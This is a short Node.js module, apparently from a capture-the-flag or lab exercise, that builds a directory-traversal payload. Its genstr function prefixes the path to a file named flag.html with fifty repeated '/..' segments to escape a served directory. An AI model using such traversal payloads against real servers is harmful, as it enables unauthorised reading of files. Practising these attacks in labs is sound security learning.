function getPayload() {
  const path = require("path"); // Import the path module
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  function genstr(n) {
    return "/..".repeat(50) + pathToFlag;
  }

  return { genstr };
}

module.exports = { getPayload };